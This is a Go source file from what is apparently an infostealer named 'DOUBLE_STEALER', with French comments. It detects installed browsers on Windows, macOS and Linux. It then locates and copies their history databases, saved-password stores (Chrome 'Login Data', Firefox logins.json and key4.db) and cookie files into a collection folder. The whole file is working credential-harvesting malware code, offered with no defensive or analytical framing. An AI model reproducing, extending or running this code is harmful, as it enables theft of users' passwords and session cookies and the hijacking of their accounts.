package getnav

import (
	"DOUBLE_STEALER/getdata"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

// Vérifie les navigateurs installés
func CheckInstalledBrowsers() map[string]string {
	var browsers = map[string]string{}
	installedBrowsers := make(map[string]string)
	var mu sync.Mutex
	var wg sync.WaitGroup

	switch runtime.GOOS {
	case "windows":
		browsers["Google Chrome"] = `C:\Program Files\Google\Chrome\Application\chrome.exe`
		browsers["Mozilla Firefox"] = `C:\Program Files\Mozilla Firefox\firefox.exe`
		browsers["Brave"] = `C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe`
		browsers["Microsoft Edge"] = `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`
		browsers["Opera"] = `C:\Program Files\Opera\launcher.exe`
		browsers["TOR"] = `C:\Program Files\Tor Browser\Browser\firefox.exe`
		browsers["Avast"] = `C:\Program Files\AVAST Software\Browser\Application\AvastBrowser.exe`

	case "darwin":
		browsers["Google Chrome"] = `/Applications/Google Chrome.app`
		browsers["Mozilla Firefox"] = `/Applications/Firefox.app`
		browsers["Brave"] = `/Applications/Brave Browser.app`
		browsers["Microsoft Edge"] = `/Applications/Microsoft Edge.app`
		browsers["Opera"] = `/Applications/Opera.app`
		browsers["TOR"] = `/Applications/Tor Browser.app`
		browsers["Safari"] = `/Applications/Safari.app`

	case "linux":
		browsers["Google Chrome"] = `/usr/bin/google-chrome`
		browsers["Mozilla Firefox"] = `/usr/bin/firefox`
		browsers["Brave"] = `/usr/bin/brave-browser`
		browsers["Microsoft Edge"] = `/usr/bin/microsoft-edge`
		browsers["Opera"] = `/usr/bin/opera`
		browsers["TOR"] = `/usr/bin/tor-browser`
		browsers["Avast"] = `/usr/bin/avast-browser`
	}

	fmt.Println("Vérification des navigateurs installés :")

	for name, path := range browsers {
		wg.Add(1)
		go func(browserName, browserPath string) {
			defer wg.Done()
			if _, err := os.Stat(browserPath); os.IsNotExist(err) {
				fmt.Printf("%s n'est pas installé.\n", browserName)
			} else {
				fmt.Printf("%s est installé.\n", browserName)
				mu.Lock()
				installedBrowsers[browserName] = browserPath
				mu.Unlock()
			}
		}(name, path)
	}

	wg.Wait()

	return installedBrowsers
}

// Récupère les chemins des fichiers d'historique des navigateurs
func GetHistoryFilePath(browser string) ([]string, error) {
	var filePaths []string
	userHome, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	var basePath string

	switch browser {
	case "Google Chrome":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
		}

	case "Mozilla Firefox":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
		case "linux":
			basePath = filepath.Join(userHome, `.mozilla/firefox`)
		}

	case "Brave":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\BraveSoftware\Brave-Browser\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/BraveSoftware/Brave-Browser/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/BraveSoftware/Brave-Browser/Default`)
		}

	default:
		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
	}

	err = filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".sqlite") {
			filePaths = append(filePaths, path)
		}
		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("erreur lors de la recherche des fichiers SQL : %v", err)
	}

	return filePaths, nil
}

// Récupère les fichiers de mots de passe
func GetPasswordFiles(browser string) ([]string, error) {
	var filePaths []string
	userHome, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	var basePath string

	switch browser {
	case "Google Chrome":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
		}
		filePaths = append(filePaths, filepath.Join(basePath, "Login Data"))

	case "Mozilla Firefox":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
		case "linux":
			basePath = filepath.Join(userHome, `.mozilla/firefox`)
		}
		filePaths = append(filePaths, filepath.Join(basePath, "logins.json"))
		filePaths = append(filePaths, filepath.Join(basePath, "key4.db"))

	default:
		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
	}

	return filePaths, nil
}

// Récupère les fichiers de cookies
func GetCookieFiles(browser string) ([]string, error) {
	var filePaths []string
	userHome, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	var basePath string

	switch browser {
	case "Google Chrome":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
		}
		filePaths = append(filePaths, filepath.Join(basePath, "Cookies"))

	case "Mozilla Firefox":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
		case "linux":
			basePath = filepath.Join(userHome, `.mozilla/firefox`)
		}
		filePaths = append(filePaths, filepath.Join(basePath, "cookies.sqlite"))

	default:
		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
	}

	return filePaths, nil
}

// ProcessNavData traite uniquement les données des navigateurs dans le dossier Navigateurs
func ProcessNavData(navFolder string) error {
	// Créer le dossier Navigateurs si nécessaire
	if _, err := os.Stat(navFolder); os.IsNotExist(err) {
		err := os.Mkdir(navFolder, 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du dossier Navigateurs : %v", err)
		}
	}

	// Vérifier les navigateurs installés
	installedBrowsers := CheckInstalledBrowsers() // Utilise la fonction de getdata

	// Parcourir les navigateurs installés
	for browser := range installedBrowsers {
		// Créer un sous-dossier pour chaque navigateur
		browserFolder := filepath.Join(navFolder, browser)
		if _, err := os.Stat(browserFolder); os.IsNotExist(err) {
			err := os.Mkdir(browserFolder, 0755)
			if err != nil {
				fmt.Printf("Erreur lors de la création du dossier %s pour %s : %v\n", browserFolder, browser, err)
				continue
			}
		}

		// Récupérer et copier les fichiers d'historique
		historyFilePaths, err := GetHistoryFilePath(browser)
		if err != nil {
			fmt.Printf("Erreur lors de la récupération des fichiers d'historique pour %s : %v\n", browser, err)
			continue
		}
		for _, filePath := range historyFilePaths {
			err := copyNavFile(filePath, browserFolder, "d'historique", browser)
			if err != nil {
				fmt.Printf("Erreur lors de la copie du fichier d'historique : %v\n", err)
			}
		}

		// Récupérer et copier les fichiers de mots de passe
		passwordFiles, err := GetPasswordFiles(browser)
		if err != nil {
			fmt.Printf("Erreur lors de la récupération des fichiers de mots de passe pour %s : %v\n", browser, err)
			continue
		}
		for _, filePath := range passwordFiles {
			err := copyNavFile(filePath, browserFolder, "de mots de passe", browser)
			if err != nil {
				fmt.Printf("Erreur lors de la copie du fichier de mots de passe : %v\n", err)
			}
		}

		// Récupérer et copier les fichiers de cookies
		cookieFiles, err := GetCookieFiles(browser)
		if err != nil {
			fmt.Printf("Erreur lors de la récupération des fichiers de cookies pour %s : %v\n", browser, err)
			continue
		}
		for _, filePath := range cookieFiles {
			err := copyNavFile(filePath, browserFolder, "de cookies", browser)
			if err != nil {
				fmt.Printf("Erreur lors de la copie du fichier de cookies : %v\n", err)
			}
		}
	}

	return nil
}

// copyNavFile est une fonction utilitaire pour copier des fichiers de navigateurs
func copyNavFile(filePath, browserFolder, fileType, browser string) error {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		fmt.Printf("Aucun fichier %s trouvé pour %s à l'emplacement : %s\n", fileType, browser, filePath)
		return nil
	}

	fmt.Printf("Fichier %s trouvé pour %s à l'emplacement : %s\n", fileType, browser, filePath)

	destination := filepath.Join(browserFolder, filepath.Base(filePath))
	err := getdata.CopyFile(filePath, destination) // Utilisation de la fonction CopyFile de getdata
	if err != nil {
		return fmt.Errorf("erreur lors de la copie du fichier %s de %s : %v", fileType, browser, err)
	}

	fmt.Printf("Le fichier %s de %s a été copié dans %s\n", fileType, browser, destination)
	return nil
}
